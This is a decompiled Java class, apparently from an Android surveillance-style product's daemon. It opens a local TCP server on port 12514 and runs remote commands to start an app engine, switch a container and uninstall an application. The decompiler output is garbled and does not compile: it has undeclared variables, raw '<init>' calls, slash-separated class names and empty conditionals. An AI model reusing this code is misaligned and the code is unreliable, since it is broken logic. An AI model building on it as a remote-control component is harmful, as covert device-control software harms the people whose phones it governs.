package com.vvt.polymorphic;

import com.fx.socket.TcpSocketCmd;
import com.fx.socket.d;
import com.fx.socket.e;
import com.vvt.polymorphic.command.RemoteStartAppEngine;
import com.vvt.polymorphic.command.RemoteSwitchContainer;
import com.vvt.polymorphic.command.RemoteUninstallApplication;
import java.io.IOException;

public abstract class a
  implements d
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.c;
  private static final boolean d = com.vvt.ak.a.e;
  private e e;
  
  private boolean a()
  {
    bool1 = b;
    if (bool1) {}
    boolean bool2 = false;
    bool1 = b;
    if (bool1) {}
    d();
    bool1 = b;
    if (bool1) {}
    l();
    for (;;)
    {
      try
      {
        bool1 = b;
        if (bool1) {}
        bool1 = e();
        if (!bool1) {
          continue;
        }
        bool1 = b;
        if (bool1) {}
        f();
        bool1 = b;
        if (bool1) {}
        b();
        bool1 = b;
        if (bool1) {}
        localObject = new com/vvt/polymorphic/command/RemoteStartAppEngine;
        ((RemoteStartAppEngine)localObject).<init>();
        localObject = ((RemoteStartAppEngine)localObject).execute();
        localObject = (Boolean)localObject;
        bool1 = ((Boolean)localObject).booleanValue();
        if (bool1)
        {
          bool1 = c;
          if (bool1) {}
          g();
          bool1 = true;
          bool2 = b;
          if (bool2) {}
          bool2 = b;
          if (bool2) {}
          return bool1;
        }
        bool1 = c;
        if (bool1) {}
        j();
      }
      catch (IOException localIOException)
      {
        Object localObject;
        bool1 = d;
        if (!bool1) {
          continue;
        }
        j();
        continue;
      }
      bool1 = false;
      localObject = null;
      continue;
      bool1 = c;
      if (bool1) {}
      j();
    }
  }
  
  public Object a(TcpSocketCmd paramTcpSocketCmd)
  {
    boolean bool1 = false;
    Boolean localBoolean = null;
    boolean bool2 = paramTcpSocketCmd instanceof RemoteStartAppEngine;
    if (bool2)
    {
      bool1 = b;
      if (bool1) {}
      bool1 = c();
      localBoolean = Boolean.valueOf(bool1);
    }
    for (;;)
    {
      return localBoolean;
      bool2 = paramTcpSocketCmd instanceof RemoteSwitchContainer;
      if (bool2)
      {
        bool1 = b;
        if (bool1) {}
        bool1 = a();
        localBoolean = Boolean.valueOf(bool1);
      }
      else
      {
        bool2 = paramTcpSocketCmd instanceof RemoteUninstallApplication;
        if (bool2)
        {
          bool1 = b;
          if (bool1) {}
          bool1 = i();
          localBoolean = Boolean.valueOf(bool1);
        }
      }
    }
  }
  
  protected void b() {}
  
  protected abstract boolean c();
  
  protected abstract boolean d();
  
  protected abstract boolean e();
  
  protected abstract boolean f();
  
  protected void g() {}
  
  protected abstract String h();
  
  protected abstract boolean i();
  
  protected void j() {}
  
  public void k()
  {
    boolean bool = a;
    if (bool) {}
    e locale = this.e;
    if (locale != null)
    {
      locale = this.e;
      locale.a();
      bool = b;
      if (!bool) {}
    }
    locale = new com/fx/socket/e;
    String str1 = h();
    String str2 = "vvt.polymorphic.server";
    int i = 12514;
    locale.<init>(str1, str2, i, this);
    this.e = locale;
    locale = this.e;
    locale.start();
    bool = b;
    if (bool) {}
    bool = a;
    if (bool) {}
  }
  
  public void l()
  {
    boolean bool = a;
    if (bool) {}
    e locale = this.e;
    if (locale != null)
    {
      this.e.a();
      locale = null;
      this.e = null;
      bool = b;
      if (!bool) {}
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/polymorphic/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */